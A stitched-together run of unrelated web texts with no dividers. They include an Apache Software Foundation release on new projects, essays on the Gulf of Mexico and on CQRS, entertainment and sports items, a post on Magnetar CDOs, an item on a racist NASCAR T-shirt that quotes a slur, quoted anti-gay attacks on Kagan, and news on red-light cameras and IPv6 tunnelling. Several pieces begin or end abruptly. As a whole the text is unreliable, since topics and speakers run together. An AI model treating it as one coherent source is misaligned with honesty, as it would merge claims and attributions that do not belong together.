Its architecture allows developers to create plugins for media - type parsing , data retrieval , querying , clustering , and more .
Following a successful 100 million page demo system , the project graduated the Apache Incubator in 2005 to become a sub-project of Apache Lucene .
- Apache Avro is a fast data serialization system that includes rich and dynamic schemas in all its processing .
A sub-project of Apache Hadoop ,
Avro features rich data structures ; a compact , fast , binary data format ; a container file to store persistent data ; remote procedure call ( RPC ) ; and simple integration with dynamic languages .
Not only is code generation not required to read or write data files nor to use or implement RPC protocols , it is an optional optimization , only worth implementing for statically typed languages .
- Apache HBase is a distributed database modeled after Google 's Bigtable .
The project started at Powerset and became a sub-project of Apache Hadoop in 2007 .
Apache HBase adds random read / write access to the Hadoop stack , extending offline processing capabilities and enabling realtime serving of very large datasets .
The project 's goal is the hosting of big tables -- billions of rows X millions of columns -- running atop commodity hardware .
HBase has been successfully deployed at Adobe , Flurry , Meetup , Mozilla , StumbleUpon , Trend Micro , and Twitter , among others , to perform analytics and as a datastore for live Websites .
Additional New Top - Level Projects Created in 2010
- Apache UIMA ( Unstructured Information Management Architecture ) is a framework for analyzing unstructured information , such as natural language text .
It supports the writing , deployment and reuse of analysis components in a wide variety of settings .
Created at IBM and submitted to the Apache Incubator in 2006 , UIMA has been adopted as the de-facto enabling platform by a significant part of the natural language processing community .
Apache UIMA graduated from the Apache Incubator in March 2010 .
- Apache Cassandra is an advanced , second - generation “ NoSQL ” distributed data store that has a shared - nothing architecture .
The Cassandra decentralized model provides massive scalability , and is highly available with no single point of failure even under the worst scenarios .
Originally developed at Facebook and submitted to the ASF Incubator in 2009 , the Project has added more than a half - dozen new committers , and is deployed by dozens of high - profile users such as Cisco WebEx , Cloudkick , Digg , Facebook , Rackspace , Reddit , and Twitter .
Apache Cassandra graduated from the Apache Incubator in March 2010 .
- Apache Subversion is a widely - used versioning control system .
The project was initated at CollabNet in 2000 and was accepted into the Apache Incubator in 2009 ; many of the people who founded Subversion also actively contribute to various initiatives at the ASF .
All of the ASF 's projects use Subversion for source code version control , and Subversion itself relies on many Apache projects such as Apache Portable Runtime ( APR ) and HTTP Web Server .
For nearly a decade , both communities have benefited from open feedback channels , where requirements from the Subversion project have helped drive new features to various Apache projects , and vice versa .
Apache Subversion is used in Bounty Source , CodePlex , Django , ExtJS , Free BSD , FreePascal , GCC , Google Code , MediaWiki , Mono , PHP , Ruby , SourceForge , and Tigris.org , as well as numerous corporations .
Apache Subversion graduated from the Apache Incubator in February 2010 .
- Apache Click is a modern Java EE
Web application framework that provides a natural , rich client style programming model .
Apache Click 's intuitive design makes it very easy to learn and use , with most developers getting up and running within a day .
As opposed to traditional component oriented Web frameworks , Click is stateless by design although stateful pages are supported .
Click exposes few abstractions to learn and understand ; the Java Servlet API is fully exposed to the developer to ease the upgrade path from an action - based framework to a component - based one to alleviate developers from maintaining redundant markup .
Apache Click entered the Apache Incubator in 2008 and graduated in February 2010 .
- Apache Shindig is an OpenSocial container and helps you to start hosting OpenSocial apps quickly by providing the code to render gadgets , proxy requests , and handle REST and RPC requests .
By providing a language - neutral infrastructure for those wishing to host OpenSocial applications on their Websites , Apache Shindig allows new sites to start hosting social apps in under an hour .
Originally created as a port of Google 's iGoogle gadget container for hosting OpenSocial compatible widgets in any Website , Shindig entered the Apache Incubator in 2007 , and graduated in January 2010 .
" The ASF has been at the center of innovation over the past 10 years , providing key pieces for much of the software and services we rely on every day , " said RedMonk analyst Michael Coté .
" These new Top - Level Projects are another example of that in action : projects that aim to help developers and organizations build the next round of useful applications . "

The oil leak on the Mississippi Canyon seafloor of the Gulf of Mexico proceeds apace .
It is now clear that BP 's recent plan did not succeed in plugging the leak .
The widely dispersed petroleum is a great disaster , but I get the distinct impression that this oil is seen as despoiling a pristine environment .
Nothing could be further from the truth .
I have this impression because , to my knowledge , the sorry state of the Gulf of Mexico before the oil spill is not being discussed .
Before the oil spill , the Gulf of Mexico was being ravaged by —
coastal erosion
hypoxia ( very low oxygen )
harmful algal blooms ( red tides )
These ongoing , slower - acting environmental disasters have a common cause : human activity .
Let 's start with coastal erosion .
The Louisiana coast depended for thousands of years on the routine overflow of the Mississippi River to deposit its sediment load and build land .
But , beginning around the 1930s , in order to save lives and cities , the federal government built massive levees to constrain and control the river , effectively stopping it from doing what nature wants it to do .
As a result , for the past 70 years or so , the sinking of the delta coast has continued unabated .
As salt water pushes inland from the gulf , it kills wetlands and marshes , habitat for wildlife and fish , and is increasingly threatening homes for many thousands of people .
Let 's move on to hypoxia and the Gulf of Mexico Dead Zone .
The Gulf of Mexico dead zone is an area of hypoxic ( less than 2 ppm dissolved oxygen ) waters at the mouth of the Mississippi River .
Its area varies in size , but can cover up to 6,000 - 7,000 square miles .
The zone occurs between the inner and mid-continental shelf in the northern Gulf of Mexico , beginning at the Mississippi River delta and extending westward to the upper Texas coast ...
Dead zones can be found worldwide .
The Gulf of Mexico dead zone is one of the largest in the world .
The dead zone is caused by nutrient enrichment from the Mississippi River , particularly nitrogen and phosphorous .
Watersheds within the Mississippi River Basin drain much of the United States , from Montana to Pennsylvania and extending southward along the Mississippi River .
Most of the nitrogen input comes from major farming states in the Mississippi River Valley ...
Nitrogen and phosphorous enter the river through upstream runoff of fertilizers , soil erosion , animal wastes , and sewage .
In a natural system , these nutrients are n't significant factors in algae growth because they are depleted in the soil by plants .
However , with anthropogenically [ human - caused ] increased nitrogen and phosphorus input , algae growth is no longer limited .
Consequently , algal blooms develop , the food chain is altered , and dissolved oxygen in the area is depleted .
The size of the dead zone fluctuates seasonally , as it is exacerbated by farming practices .
It is also affected by weather events such as flooding ( more info ) and hurricanes ...
Nutrient overloading and algal blooms lead to eutrophication , which has been shown to reduce benthic biomass and biodiversity .
Hypoxic water supports fewer organisms and has been linked to massive fish kills in the Black Sea and Gulf of Mexico .
Satellite image of the northern Gulf of Mexico / Mississippi Delta showing hypoxic coastal water ( light blue ) .
This color change is due to excessive nutrients being washed into the sea .
Let 's finish up with harmful algal blooms ( HABs ) , also called red tides .
There are some 4,000 known species of microscopic algae , called microalgae or phytoplankton , in the global ocean .
Approximately 300 of these have been identified with periodic explosions of growth , in what amounts to extensive monocultures of the particular species involved .
Dense growths of microalgae are broadly termed " blooms . "
While single species blooms can turn the water surface red , brown , yellow , green or white , they are often generically referred to as " red tides " and are often associated with harmful or toxic effects .
When the blooming microalgae have properties that are deemed harmful to humans or other life , the blooms are called Harmful Algal Blooms , or HABs
" and are often associated with harmful or toxic effects .
In recent years , there has been growing alarm over what appears to he an " epidemic " of HABs worldwide ...
Although there are some scientists who believe the increase in reports of HABs is a function of increased awareness and monitoring , others have provided compelling evidence that , for some regions , human activities play an important role .
The primary human contribution to HABs is thought to be nutrient pollution — from , amongst other things , agriculture , sewage outfalls and mining — creating a more favorable , nutrient - rich environment in coastal waters in which certain groups of phytoplankton can thrive .
. .
Climate change may also be making some coastal environments more hospitable to harmful phytoplankton species [ via ocean warming ]
may also be making some coastal environments more hospitable to harmful phytoplankton species [ via ocean warming ]
Many species of phytoplankton are also transported around the world in ships ' ballast water and discharged in areas where they did not previously occur .
Others are distributed accidentally through the transfer of shellfish for aquaculture .
Reading this text , perhaps you 've gotten the impression that the Gulf of Mexico is just one big toxic waste dump .
You would be correct .
Although coastal erosion , deepwater hypoxia and algal blooms are natural processes , human interference has made these processes much worse in each case .
So there you have it .
Is this brief presentation meant to detract from the awfulness of the oil spill ?
Not at all .
I merely wish to point out that the oil spill is a case of piling on — we made a bad situation much , much worse .
Many species in the Gulf were already under severe pressure before the blow - out .
Everything , including the wildlife , is covered with oil , which just accelerates the ongoing environmental deterioration & species die - off .
See my How We Wrecked The Oceans to understand the full extent of our destruction of the world 's oceans .
As if all this were n't bad enough , everybody is forecasting a very severe hurricane season .
Let 's conclude with some pictures .
( Thanks to my friend Sally for the photos . )
CQRS is n’t the answer – it ’s just one of the questions Friday , May 7th , 2010 .
With the growing interest in Command / Query Responsibility Segregation ( CQRS ) , more people are starting to ask questions about how to apply it to their applications .
CQRS is actually in danger of reaching “ best practice ” status at which point in time people will apply it indiscriminately with truly terrible results .
One of the things that I ’ve been trying to do with my presentations around the world on CQRS was to explain the why behind it , just as much as the what .
The problem with the format of these presentations is that they ’re designed to communicate a fairly closed message : here ’s the problem , here ’s how that problem manifests itself , here ’s a solution .
In this post , I ’m going to try to go deeper .
The hitchhiker ’s guide to the galaxy
In this most excellent book , one of the things that struck me was the theme that made it ’s way through the whole book – starting with the answer to life , the universe , and everything : 42 .
By the time you get to the end of the book , you find out that the real question to life , the universe , and everything is “ what do you get when you multiply 6 by 9 ” .
And that ’s how the book leaves it .
To us engineers , we ca n’t just accept the fact that the book would say that 6 * 9 = 42 when we know it ’s 54 .
After bashing our heads on the rigid rules of math , we realize that not all math problems are necessarily in base 10 , and that if we switch to base 13 , the number 42 is 4*13 + 2 = 54 .
So , the book was right – but that ’s not the point .
What ’s the point ?
The hitchhiker ’s guide is an example of a teaching technique which presents an apparent paradox , leaving the student to dig up unspoken and unthought assumptions in order to resolve it .
Key to this technique are rigid rules which do not allow any compromise or shortcuts on the student ’s part .
The purpose of this technique is not for the student to learn the answer , but to gain deeper understanding , which in turn changes the way they go about thinking about problems in the future .
So , when given the problem 4 * 5 , we do not just immediately answer 20 , instead we clarify in which numeric base the question is being phrased , and only then go to solve the problem .
In base 13 , the answer would be 17 .
In hex , the answer would be 14 .
The externally visible change is that we know which questions to ask in order to arrive at the right answer – not that we know the answer ahead of time .
Making an “ ass ” out of “ u ” and “ me ” Let ’s start at the end – one of the unspoken assumptions that has been causing problems :
All businesses can be treated the same from the perspective of software .
In our previous example , we assumed that all math problems use base 10 .
It turns out that different bases are useful for different domains ( like base 2 for computers ) .
We can say similar things about degrees and radians in geometry .
The more we look at the real world , the more we see this repeating itself .
There ’s no reason that software should be any different .
Base 10 is not a ubiquitous best practice .
We should n’t be surprised that there really are n’t best practices for software either .
Here ’s another problematic assumption : “ The business ” can ( and do ) tell us what they need in a way we can understand .
So many software fads have been built on the quicksand of this assumption .
OOAD – on verbs and nouns .
4GL and other visual tools that “ the business ” will use directly .
SOA – on IT business alignment .
I expect we have n’t seen the end of this .
Some of you may be wondering why this is false , others are sagely nodding their heads in agreement .
The myth of “ the business ” Unless you have a single user , who is also the CEO paying for the development , there is no “ the ” .
It ’s an amalgam of people with different backgrounds , skills , and goals – there is no homogeneity .
Even if no software was involved , many business organizations are dysfunctional with conflicting goals , policies , and politics .
To some extent , we technical people have hidden ourselves away in IT to avoid the scary world of business whose rules we do n’t understand .
With the rise in importance of information to the world , we ’ve been pulled back – being forced to talk to people , and not just computers .
Luckily , we ’ve been able to create a buffer to insulate ourselves – we ’ve taken the less successful technical people from our heard and nominated them “ business analysts ” .
No , not all companies do it this way , but we do need to take a minute to reflect on how information flows between the business Mars into and out of the IT Venus .
On human communication Even if we made this insulation layer more permeable , allowing and encouraging more technical people and business people to cross its boundary , we still need to deal with the problem of two humans communicating with each other .
There are enough books that have been written on this topic , so I wo n’t go into that beyond recommending ( strongly ) to technical people to read ( some of ) them .
Rather , I ’d like to focus on the environment in which these discussions take place .
IT has been around long enough , and users have used computers long enough , that a certain amount of tainting has taken place .
If the world was a trial , the evidence would have been thrown out as untrustworthy .
When users tell you what they want , they ’re usually framing that with respect to the current system that they ’re using .
“ Like the old system – but faster , and with better search , and more information on that screen , and … ”
At this point , business analysts write down and formalize these “ requirements ” into some IT - sanctioned structure ( use cases , user stories , whatever ) , at which point developers are told to build it .
Users only know what they did n’t want when developers deliver exactly what was asked .
How can that be ?
These are not the “ requirements ” you are looking for Users ultimately dictate solutions to us , as a delta from the previous set of solutions we ’ve delivered them .
That ’s just human psychology – writer ’s block when looking at a blank page , as compared to the ease with which we provide “ constructive criticism ” on somebody else ’s work .
We need to get the real requirements .
We need to probe beyond the veneer :
Why do you need this additional screen ?
What real - world trigger will cause you to open it ?
Is there more than one trigger ?
How are they different ?
etc , etc , etc …
This is real work – different work than programming .
It requires different skills .
And that ’s not even getting into the political navigation between competing organizational forces .
But let ’s say that you do n’t have ( enough ) people with these skills in your organization .
What then ?
Enter CQRS CQRS gives us a set of questions to ask , and some rigid rules that our answers must conform to .
If our answers do n’t fit , we need to go back to the drawing board and move things around and / or go back to “ the business ” and seek deeper understanding there .
For each screen / task / piece of data :
Will multiple users be collaborating on data related to this task ?
Look at every shred of raw data , not just at the entity level .
Are there business consistency requirements around groups of raw data ?
If “ the business ” answers no – ask them if they see that answer changing , and if so , in what time frame , and why .
What changing conditions in the business environment would cause that to change – what other parts of the system would need to be re-examined under those conditions .
After understanding all that and you find a true single - user - only - thing , then you can use standard “ CRUD ” techniques and technologies .
There are no inherent time - propagation problems in a single - user environment – so eventual consistency is beyond pointless , it actually makes matters worse .
On the other hand , if the business - data - space is collaborative , the inherent time - propagation of information between actors means they will be making decisions on data that is n’t up - to - the - millisecond - accurate anyway .
This is physics , gravity – you ca n’t fight it ( and win ) .
The rule for collaboration Actors must be able submit one - way commands that will fail only under exceptional business circumstances .
The challenge we have is how to achieve the real business objectives uncovered in our previous “ requirements excavation ” activities and follow this rule at the same time .
This will likely involve a different user - system interaction than those implemented in the past .
UI design is part of the solution domain – it should n’t be dictated by the business ( otherwise it ’s like someone asking you to run a marathon , but also dictating how you do so , like by tying your shoelaces together ) .
Many of the technical patterns I described in my previous blog post describe the tools involved .
BTW , hackers can be considered “ exceptional actors ” – the business actually wants their commands to fail .
In Summary The hard and fast rule of CQRS about one - way commands is relevant for collaborative domains only .
This domain has inherent eventual consistency – in the real world .
Taking that and baking it into our solution domain is how we align with the business .
The process we go through , until ultimately arriving at one - way - almost - always - successful - commands is business analysis .
Rejecting pre-formulated solutions , truly understanding the business drivers , and then representing those as directly as possible in our solution domain – that ’s our job .
After doing this enough times and / or in more than one business domain , we may gain the insight that there is no cookie - cutter , one - size - fits - all , best - practice solution architecture for everything .
Each problem domain is distinct and different – and we need to understand the details , because they should shape the resulting software structure .
The next time the business tell us to implement 42 , we ’ll use CQRS along with other questioning techniques until we can get “ 6 x 9 ” out of them , learning from the exercise what are the significant and stable parts of the business – ultimately helping us to “ build the right system , and to build the system right ” .

serie architects / chris lee and kapil gupta : rc office complex , mumbai all images courtesy serie architects
the ongoing transformation of kurla in north mumbai , india is characterized by the relentless proliferation of new office blocks , where the typical 5 - 6 storey blocks adopts the exclusive corporate lobbies as a strategy to import the image of the cbd into this former small industrial area .
chris lee and kapil gupta of UK serie architects seek to resist this tendency with their project to create a clear separation between the public and the existing city and the projected and exclusive corporate entity .
their proposal begins with the rethinking of the lobby and atrium of typical office blocks .
the rc office can be seen as a single office block , sliced open into 2 smaller blocks but brought back together by a public void .
the main atrium and lobby space as the new public void is conceived as a series of rotating volumes articulated by ruled surfaces .
at each different rotation , the atrium and lobbies takes on a different programmatic role .
starting from the ground , the typically excusive corporate lobby is transformed into a public promenade , connecting lbs road on the west side of the site to the existing lake on the north .
as the atrium rotates upwards , it dispenses other public program along its ruled surface : cafes , gym , roof decks and lounges .
the rotational atrium also acts as a light catcher , drawing light along its rotation , illuminating the ruled surface and reflecting light into the heart of the building .

Pink Flamingo Farm
Long Beach really wants to be the greenest city in the country .
They are working towards being a truly walkable city , complete with a large bicycle network .
Another sustainable goal of theirs are community gardens and urban farms .
To date , there are 15 of them with a 16th to be announced on Monday .
For Meredith Reynolds , the city of Long Beach 's Sustainability Coordinator , the city 's approach to gardens is found in their history .
" This was all a farm , " she explained over the phone .
" It 's getting back to that deep seeded history of what Long Beach used to be . "
In October , the Trust for Public Land — that 's the group behind saving the Hollywood Sign — ranked Long Beach as the number 3 city in the country for most urban gardens per capita .
And come Monday , they might edge out the competition for a higher ranking spot .
Felipe Massa 's steering wheel – Click above to watch video after the jump
Despite what you might assume after traveling on America 's highways and byways , operating a vehicle is n't terribly complicated .
At most , there are three pedals , a steering wheel and a gear shift lever .
Everything else is just periphery .
While the onslaught of infotainment doodads and climate control wizardry have turned the cockpit of your favorite conveyance from an exercise in simplicity into a buffet of dials and buttons , we assure you it 's nothing like what Felipe Massa has to contend with .
You see , for 2010 , Ferrari decided to make things easier on Mr. Massa by simplifying his steering wheel .
The old tiller was a maze of controls , thanks largely to the KERS system the team employed for 2009 .
Now all it takes to get cozy with the interface that controls the F10 racer is a mere nine minutes of your time and a memory like a steel trap .
Is it possible to have any more respect for our favorite Formula One pilots ?
We did n't think so until we caught sight of the video after the jump .
Somehow , imaging trying to remember whether or not the engineer said the front wing should be at a seven and the fuel consumption at a four or vice versa while lapping a circuit at mind - bending speed just makes our heads hurt .

Right Wing Watch rounds up reaction from the rump .
Tom Minnery of Focus on the Family clarifies the stance of social conservatives :
Kagan 's nomination is a triumph for liberal ideology and judicial activism .
She has never been a judge , nor written a judicial opinion .
In fact , she has very limited experience in the actual practice of law .
Her resume reveals her to be an academic who has served liberal judges , liberal presidents , and liberal universities .
Her entire career has been lived in a narrow slice of the judicial spectrum .
Even with her sparse legal record , one thing stands outher emotional and legal commitment to the LGBT agenda .
American Family Association and Americans For Truth are a tad more direct :
It 's time we got over the myth that what a public servant does in his private life is of no consequence .
We cannot afford to have another sexually abnormal individual in a position of important civic responsibility , especially when that individual could become one of nine votes in an out of control oligarchy that constantly usurps constitutional prerogatives to unethically and illegally legislate for 300 million Americans .
The stakes are too high .
Social conservatives must rise up as one and say no lesbian is qualified to sit on the Supreme Court .
Will they ?
The days are past when this could be brushed under the rug .
Let 's have an honest debate , can we ?
The way to counter prejudice is through truth - not avoidance .
For the right to oppose Kagan merely because she is gay - if she is - would be one more step toward their self - destruction .
By staying mum , the Obamites may be playing yet another rope - a - dope .
I just cannot see how in 2010 , ambiguity is an option .
I mean : who would claim that John Roberts ' heterosexuality is somehow private ?
It is a demonstrably reported fact that there would now be no Protestants on the court - just Catholics and Jews .
Why is this not an invasion of privacy , if asking someone about their sexual orientation is ?

The trailer for The Human Centipede .
During a stopover in Germany in the middle of a carefree roadtrip through Europe , two American girls find themselves alone at night when their car breaks down in the woods .
Searching for help at a nearby villa , they are wooed into the clutches of a deranged retired surgeon who explains his mad scientific vision to his captives ' utter horror .
They are to be the subjects of his sick lifetime fantasy : to be the first to connect people , one to the next , via their gastric system , and in doing so bring to life ' the human centipede ' .
Truly one - of - a- kind , Tom Six 's twisted biological horror film The Human Centipede confidently goes where few films have dared to go .
The sick vision of a demented surgeon , a role portrayed so brilliantly by Dieter Laser it is sure to join Freddy , Jason , and Leatherface in the horror pantheon , is a 100 % medically accurate nightmare .

Mickey Mouse Finds His Voice
This is so cool !
Seems as if Disney Imagineering is testing out technology that will allow The Mickey Mouse character you see in the parks to actually speak and interact guests .
In the past , all costumed characters have been silent with the exception of shows and parades .
However just recently , a few lucky guests were invited to be part of an experiment conducted in Mickey ’s Toon Town studio where the character soke to them and even blinked his eyes .
Rather than try to describe it to you in words , better to see it in action which you can in the video below .
According to Disney Parks blog , this was part of a process we call “ playtesting ” as it gives Imagineers a chance to develop new concepts with guests long before they end up in the Parks .
“ We ’re always looking for innovative ways to let guests interact with our beloved characters , ” says Disney Imagineer and head of Advanced Development Scott Trowbridge .
“ And we have many more surprises up our sleeves . ”
No word on when we will finally see a talking Mickey and possibly even other characters on a regular basis in the parks but it is certainly an awesome feature , especially if you have a child who is familiar with the Disney characters .

i liked the premise , the music was entertaining -- the difficulty lacked , but then again , i do n't think you were shooting for it being a challenge game ; just fun to see come together .
i like this .
By Andrew Dittmer , a mathematician with hedge fund experience , and Richard Smith , a UK based capital markets IT consultant
Readers of this blog are by now familiar with the incredible story of how a single hedge fund ( Magnetar ) managed to play a shockingly extensive role in inflating the housing bubble in 2006 - 2007 .
The story was first broken seven weeks ago in Yves ’ book ECONNED ( completed in early October 2009 ) .
Despite the obvious importance of the Magnetar strategy , the media at large was still generally ignorant of what happened .
Earlier this month , though , this silence has been broken with an extensive report on the Magnetar trade prepared by the public interest research group ProPublica .
The ProPublica piece contains a wealth of narrative detail and some useful links to documents including prospectuses of particular Magnetar CDOs .
The official Magnetar responses ( and refusals to comment ) to particular questions from ProPublica are especially illuminating .
Of course , the ProPublica team had no way of knowing that Yves ’ book would contain a chapter on the same material , and it might have been frustrating for them to see a story to which they had devoted so much effort first appear elsewhere .
Still , they have every reason to feel proud – their article contains important information about the Magnetar trade that is not found in ECONNED , and remains valuable in its own right .
Given the intrinsic worth of the ProPublica piece , it is hard to understand why its authors felt it necessary to try to minimize the treatment of the Magnetar story in ECONNED .
They write :
Several journalists have alluded to the Magnetar Trade in recent years , but until now none has assembled a full narrative .
Yves Smith , a prominent financial blogger who has reported on aspects of the Magnetar Trade , writes in her new book , “ Econned , ” that “ Magnetar went into the business of creating subprime CDOs on an unheard of scale .
If the world had been spared their cunning , the insanity of 2006 - 2007 would have been less extreme and the unwinding milder . ”
In other words , the ProPublica authors credit Yves for some “ reporting ” on the Magnetar trade and for a sound bite , while claiming to have been the only ones to have “ assembled a full narrative . ”
A reader of the ProPublica piece would have no clue from this description that Yves ’ book contains 22 pages of detailed description of the Magnetar trade , together with footnotes and an appendix that discuss even more technical details .
By far the most important consideration is to help make sure that the Magnetar and similar trading strategies become as well understood and widely known as possible .
Since we believe that the ProPublica authors similarly put the public interest ahead of any worries about who gets the spotlight for the story , we are troubled by what looks like an attempt to diminish Yves ’ role .
Perhaps the authors were in a hurry to finish their piece and did not actually read ECONNED carefully enough to understand Yves ’ contribution .
The most constructive response therefore seems to be to reiterate how important it is for people who genuinely care about financial reform to support one other , and then to discuss some of the differences between the two pieces , and how they complement one another .
The ProPublica piece is especially notable for containing
• information about how Magnetar sought CDO structures that were particularly congenial to its strategy ( so - called “ triggerless ” structures ) .
• a list of 26 of the ( purportedly ) 30 CDOs in the Magnetar Constellation program , together with some information about those CDOs .
• a convenient timeline showing when these CDOs were created • a study of how rapidly the Magnetar CDOs blew up compared to similar CDOs that were not sponsored by Magnetar .
• some information about who ended up with tranches of the Magnetar CDOs , although a great deal of work still remains to be done here by people who are interested in this issue .
• a case where another party ( Ischus Capital Management ) , refused to do a deal with Magnetar .
One particularly interesting detail in the ProPublica piece is the account of how Magnetar offloaded some of the equity slices they had retained by stuffing 18 of them into a special CDO ( Tigris ) that through the usual miracles was rated by S&P and Fitch and then sold to the Japanese bank Mizuho .
Our own research is largely consistent with the list that ProPublica provides of 26 Magnetar CDOs .
Specifically , the transaction detail we have worked out to date identifies 29 of perhaps as many as 50 Magnetar CDOs and supplies some information not given in the ProPublica piece .
There are some cases where the ProPublica numbers for par value diverge from ours on the upside ; knowledgeable readers are encouraged to weigh in , both to confirm numbers that disagree and to identify the mysterious “ last ” Magnetar CDO .
See our spreadsheet on the transactions , developed with the input of market participants and prepared by Tom Adams and Andrew Dittmer , here .
What is regrettable is that the ProPublica piece does not emphasize the huge systemic role that the Magnetar strategy played in amplifying the impact of the subprime bubble .
The authors begin their piece by pointing out that
In late 2005 , the booming U.S. housing market seemed to be slowing .
The Federal Reserve had begun raising interest rates .
Subprime mortgage company shares were falling .
Investors began to balk at buying complex mortgage securities .
The housing bubble , which had propelled a historic growth in home prices , seemed poised to deflate .
And if it had , the great financial crisis of 2008 , which produced the Great Recession of 2008 - 09 , might have come sooner and been less severe .
Despite this promising beginning , the ProPublica authors never actually explain to the reader the connection between the Magnetar story and [ emphasize ] why , contrary to what should have been expected , the housing bubble swelled to massive proportions in 2006 - 2007 .
Even with the rating agencies ’ colossal and deservedly criticized misratings , the subprime bubble would have died a much earlier , less costly death absent the way Magnetar ’s strategy drove demand and multiplied the size of the total exposures in the toxic phase of the subprime bubble .
The fact that a single hedge fund , with a comparatively small amount of capital , could wreak such damage , indicates that the true leverage and costs of recent financial “ innovations ” are not well understood .
Omitting the systemic importance of Magnetar risks turning the Magnetar story into a scandal about an individual firm , rather than what it truly is : an indictment of the financial system as a whole .
Some other important details about the Magnetar trades that are discussed in ECONNED include :
• How a seemingly small amount of BBB tranches from subprime bonds used in Magnetar ’s CDOs , had a devastating impact on the subprime market .
Consistently conservative analyses indicate that in the peak years of 2006 and early 2007 , Magnetar ’s program drove the demand for roughly 35 % of subprime bonds .
Industry sources have estimated that the number may be as high as 50 % to 75 % .
• Magnetar ’s trade was imitated by other hedge funds and dealers , further increasing the systemic impact . •
The deals were mostly hybrids , typically with 20 % cash bonds and 80 % credit default swaps ; why this structure was advantageous for Magnetar . •
The links between the demand for CDOs and the “ negative basis trade ” that was arguably a widespread form of bonus fraud .
( When a AAA instrument was insured by an AAA guarantor , internal reports typically treated it as if all the expected income in future years was discounted to the present .
As we know now , in the overwhelming majority of cases , bonuses were paid on income that was never earned .
This mechanism was THE reason many banks would up holding so much AAA CDO inventory – it was more lucrative for the traders to retain and “ hedge ” it than sell it . ) •
The masquerade of almost entirely BBB subprime risk as AAA suppressed CDS spreads on BBB subprime bonds , the most actively traded tranche of the original bonds .
Via arbitrage , this also influenced subprime bond pricing , which in turn lowered the yield on the loans themselves .
In this manner , the mezzanine CDO market directly influenced spreads in the subprime housing market .
There ’s perverse irony at work here .
The blogosphere often complains of having its scoops ignored or worse , stolen by the mainstream media .
Here we have a case where an critical story presented via the absurd long lead time off books ( the finalization deadline of early October 2009 versus a publication date of early March 2010 ) still beats MSM and blogosphere to the punch by six weeks , yet has been given less recognition that it would seem to deserve by both .
And the side effect is serious , that the systemic impact of the Magnetar trade still remains largely under the radar .
After breaking out of LunarMax , a moon - based maximum security prison , Boris the Animal ( Jemaine Clement ) decides to go back in time and eliminate the person who arrested him - Agent K ( Josh Brolin ) .
When he does so , Agent J ( Will Smith ) realizes that the timeline has been changed and he too travels back to July 15 , 1969 , the day before Agent K is killed .
After overcoming some disbelief , J manages to convince young K and others of just who he is and why he 's there .
With the help of Griffin ( Michael Stuhlbarg ) , a being who can see all timelines , they track Boris down .
J also learns a secret , something old Agent K ( Tommy Lee Jones ) had never told him .

Despite NASCAR 's white - washing PR , one redneck fan at last month 's Talladega 500 shows off what may be the new NASCAR enthusiast uniform : cheap beer in a cozy , giant Fauxkleys , and a sleeveless t- shirt proclaiming " No Niggers In NASCAR . "

This shirt is a reminder that NASCAR , despite its official messaging , has a fan base that puts the white in bread — and they 're happy to have it stay that way .
As Pam's House Blend put it :
" Demographic analysis found that while blacks represent only 8.6 % of NASCAR 's audience , it 's a 12 % spurt since 2005 .
Apparently that fact has caused consternation among some of the blue collar bigots that now have to sit in close proximity to more of " those people . "

And NASCAR 's own decisions seem to reflect this opinion .
Darrell Wallace made history as the first African - American to win a NASCAR Pro Series in April .
Where was the Danica Patrick level of media frenzy being stoked by NASCAR PR ?
Heck , we only heard about it weeks after the race .
Why did nobody know it even happened ?
Likely it was out of a desire to not alienate their white fans — like this guy here .

A lot of people do n’t like red - light cameras .
But perhaps nowhere in California is the opposition more heated than in Anaheim .
Not only does the City Council not want to install any of the cameras , but it is preparing a ballot measure that would permanently ban them .
Mayor Curt Pringle , who is driving the effort during his last year in office , said he does not want future city governments tempted to collect revenue “ on the back of public safety . ”
“ There is always pressure on local government to raise revenue , and I think this is one of those options that … should be taken off the table completely , ” he said .

The City Council voted unanimously last week in support of Pringle ’s proposal to amend the City Charter to prohibit the use of automated traffic enforcement systems .
Members now plan to adopt a resolution to put the amendment on the ballot for the November general election , which Pringle said would be the least expensive way to put the matter before voters .
A number of California cities are reviewing the costs and benefits of red - light cameras , said Jennifer Whiting , a lobbyist for the League of California Cities .
But she was not aware of any municipality that has taken steps to prevent the system from ever being used .
Red - light violations accounted for nearly 40 % of the 2,397 accidents at Anaheim intersections between 2007 and 2009 , said city police spokesman Sgt. Rick Martinez .
In all , there were 12,858 traffic accidents during that period .
Dozens of California cities have turned to automated photo enforcement systems in recent years to monitor dangerous intersections around the clock .
Supporters say the cameras discourage red - light running , free up patrol officers for other duties and provide a welcome boost to government coffers .

Garden Grove saw a 46 % decline in accidents at camera - monitored intersections , said city traffic engineer Dan Candelaria , citing a 2004 - 05 Orange County grand jury report that compared police figures from the year before and the year after the system was installed at three intersections .
Eight of the city ’s intersections are now covered .
“ The main goal of the program was to reduce accidents , ” Candelaria said .
“ It ’s delivered on that , and I think we ’re all happy with it . ”
Pringle contends that that argument is “ somewhat of a ruse . ”

“ I believe there is enough evidence now that demonstrates that red - light cameras do not necessarily cause safer intersections , ” he said at last week ’s council meeting .
“ I believe many red - light cameras that are placed around the county and around the state are done for the purpose of local governments ’ revenue collection as opposed to traffic safety . ”
In Costa Mesa , the number of crashes increased 13 % at the four intersections equipped with cameras between 2003 and 2009 , said Sgt. Greg Scott of the city Police Department .
The figure included a 20 % increase in rear - end collisions , which critics say are a risk when motorists brake suddenly to avoid being caught on camera running a light .
However , the police study also found that the number of broadside collisions — often the most devastating accidents — dropped 30 % , and the number of crashes resulting in injury decreased 15 % .
The private company that operated the system during the study has gone into receivership , and the city is considering whether to continue using the cameras , Scott said .
Only two intersections are currently covered .

Earlier this year , Gov. Arnold Schwarzenegger proposed using red - light cameras to enforce speed limits in a bid to generate additional revenue to help close the state budget gap .
But some city officials are beginning to question the cost - effectiveness of the system for their municipalities .
Cities pay private contractors to install and operate the systems .
The revenue collected from traffic violations is then shared between the state , county and local governments .
Although the number of citations issued at intersections generally increases when cameras are installed , motorists do n’t always pay the fees , which can top $ 500 .
Some citations are dismissed by courts , and a growing number of motorists opt for community service .
The Los Angeles city budget office reported last month that the city collects about $ 3.8 million a year from its 32 camera - equipped intersections , which is roughly what the program costs .
Because some red - light ticket income is dedicated to other traffic safety programs , such as school crossing guards , the city has been paying an extra $ 1.6 million a year from its cash - strapped general fund to keep the camera program going .

The world is running out of IP addresses .
IP v6 to the rescue !
Unfortunately most ISPs dont yet provide IP v6 connectivity .
But be sure to ask your provider in order to increase awareness .
In the meantime a number of tunnelling mechanisms have been developed , among them Teredo .
Miredo is a GPL implementation of Teredo and it is now available in Portage .
The advantage of Toredo is , that it also works through NAT .
